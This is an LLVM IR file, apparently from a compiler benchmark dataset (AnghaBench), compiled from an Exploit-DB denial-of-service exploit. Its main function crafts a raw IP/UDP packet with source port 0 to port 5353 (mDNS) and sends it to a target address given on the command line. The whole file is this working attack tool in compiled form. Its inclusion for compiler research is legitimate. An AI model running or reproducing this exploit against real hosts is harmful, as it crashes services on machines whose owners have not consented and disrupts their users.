; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_7520.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_7520.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.addr = type { i32 }
%struct.ip_hdr = type { i32, i32, i32, i32, i8*, i8*, i32, i32, i64, i64, i64 }
%struct.udp_hdr = type { i8*, i8*, i8*, i64 }
%struct.intf_entry = type { %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }

@IP_HDR_LEN = common dso_local global i32 0, align 4
@UDP_HDR_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [43 x i8] c"error: please specify a target ip address\0A\00", align 1
@IP_TTL_MAX = common dso_local global i32 0, align 4
@IP_PROTO_UDP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [46 x i8] c"error: root privileges needed for raw socket\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.addr, align 4
  %9 = alloca %struct.ip_hdr*, align 8
  %10 = alloca %struct.udp_hdr*, align 8
  %11 = alloca %struct.intf_entry, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i64, align 8
  %15 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @IP_HDR_LEN, align 4
  %17 = load i32, i32* @UDP_HDR_LEN, align 4
  %18 = add nsw i32 %16, %17
  store i32 %18, i32* %12, align 4
  %19 = load i32, i32* %12, align 4
  %20 = zext i32 %19 to i64
  %21 = call i8* @llvm.stacksave()
  store i8* %21, i8** %13, align 8
  %22 = alloca i8, i64 %20, align 16
  store i64 %20, i64* %14, align 8
  %23 = load i32, i32* %4, align 4
  %24 = icmp slt i32 %23, 2
  br i1 %24, label %31, label %25

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @addr_aton(i8* %28, %struct.addr* %8)
  %30 = icmp ne i64 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %25, %2
  %32 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %15, align 4
  br label %103

33:                                               ; preds = %25
  %34 = trunc i64 %20 to i32
  %35 = call i32 @memset(i8* %22, i32 0, i32 %34)
  %36 = bitcast i8* %22 to %struct.ip_hdr*
  store %struct.ip_hdr* %36, %struct.ip_hdr** %9, align 8
  %37 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %38 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %37, i32 0, i32 0
  store i32 4, i32* %38, align 8
  %39 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %40 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %39, i32 0, i32 1
  store i32 5, i32* %40, align 4
  %41 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %42 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %41, i32 0, i32 10
  store i64 0, i64* %42, align 8
  %43 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %44 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %43, i32 0, i32 9
  store i64 0, i64* %44, align 8
  %45 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %46 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %45, i32 0, i32 8
  store i64 0, i64* %46, align 8
  %47 = load i32, i32* @IP_TTL_MAX, align 4
  %48 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %49 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %48, i32 0, i32 7
  store i32 %47, i32* %49, align 4
  %50 = load i32, i32* @IP_PROTO_UDP, align 4
  %51 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %52 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %51, i32 0, i32 6
  store i32 %50, i32* %52, align 8
  %53 = call i8* @htons(i32 57005)
  %54 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %55 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %54, i32 0, i32 5
  store i8* %53, i8** %55, align 8
  %56 = load i32, i32* %12, align 4
  %57 = call i8* @htons(i32 %56)
  %58 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %59 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %58, i32 0, i32 4
  store i8* %57, i8** %59, align 8
  %60 = load i32, i32* @IP_HDR_LEN, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %22, i64 %61
  %63 = bitcast i8* %62 to %struct.udp_hdr*
  store %struct.udp_hdr* %63, %struct.udp_hdr** %10, align 8
  %64 = load %struct.udp_hdr*, %struct.udp_hdr** %10, align 8
  %65 = getelementptr inbounds %struct.udp_hdr, %struct.udp_hdr* %64, i32 0, i32 3
  store i64 0, i64* %65, align 8
  %66 = call i8* @htons(i32 0)
  %67 = load %struct.udp_hdr*, %struct.udp_hdr** %10, align 8
  %68 = getelementptr inbounds %struct.udp_hdr, %struct.udp_hdr* %67, i32 0, i32 2
  store i8* %66, i8** %68, align 8
  %69 = call i8* @htons(i32 5353)
  %70 = load %struct.udp_hdr*, %struct.udp_hdr** %10, align 8
  %71 = getelementptr inbounds %struct.udp_hdr, %struct.udp_hdr* %70, i32 0, i32 1
  store i8* %69, i8** %71, align 8
  %72 = load i32, i32* @UDP_HDR_LEN, align 4
  %73 = call i8* @htons(i32 %72)
  %74 = load %struct.udp_hdr*, %struct.udp_hdr** %10, align 8
  %75 = getelementptr inbounds %struct.udp_hdr, %struct.udp_hdr* %74, i32 0, i32 0
  store i8* %73, i8** %75, align 8
  %76 = call i32* (...) @intf_open()
  store i32* %76, i32** %7, align 8
  %77 = load i32*, i32** %7, align 8
  %78 = call i32 @intf_get_dst(i32* %77, %struct.intf_entry* %11, %struct.addr* %8)
  %79 = load i32*, i32** %7, align 8
  %80 = call i32 @intf_close(i32* %79)
  %81 = getelementptr inbounds %struct.intf_entry, %struct.intf_entry* %11, i32 0, i32 0
  %82 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %85 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %84, i32 0, i32 3
  store i32 %83, i32* %85, align 4
  %86 = getelementptr inbounds %struct.addr, %struct.addr* %8, i32 0, i32 0
  %87 = load i32, i32* %86, align 4
  %88 = load %struct.ip_hdr*, %struct.ip_hdr** %9, align 8
  %89 = getelementptr inbounds %struct.ip_hdr, %struct.ip_hdr* %88, i32 0, i32 2
  store i32 %87, i32* %89, align 8
  %90 = load i32, i32* %12, align 4
  %91 = call i32 @ip_checksum(i8* %22, i32 %90)
  %92 = call i32* (...) @ip_open()
  store i32* %92, i32** %6, align 8
  %93 = load i32*, i32** %6, align 8
  %94 = icmp ne i32* %93, null
  br i1 %94, label %97, label %95

95:                                               ; preds = %33
  %96 = call i32 @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.1, i64 0, i64 0))
  store i32 1, i32* %3, align 4
  store i32 1, i32* %15, align 4
  br label %103

97:                                               ; preds = %33
  %98 = load i32*, i32** %6, align 8
  %99 = load i32, i32* %12, align 4
  %100 = call i32 @ip_send(i32* %98, i8* %22, i32 %99)
  %101 = load i32*, i32** %6, align 8
  %102 = call i32 @ip_close(i32* %101)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %15, align 4
  br label %103

103:                                              ; preds = %97, %95, %31
  %104 = load i8*, i8** %13, align 8
  call void @llvm.stackrestore(i8* %104)
  %105 = load i32, i32* %3, align 4
  ret i32 %105
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @addr_aton(i8*, %struct.addr*) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i32* @intf_open(...) #2

declare dso_local i32 @intf_get_dst(i32*, %struct.intf_entry*, %struct.addr*) #2

declare dso_local i32 @intf_close(i32*) #2

declare dso_local i32 @ip_checksum(i8*, i32) #2

declare dso_local i32* @ip_open(...) #2

declare dso_local i32 @ip_send(i32*, i8*, i32) #2

declare dso_local i32 @ip_close(i32*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
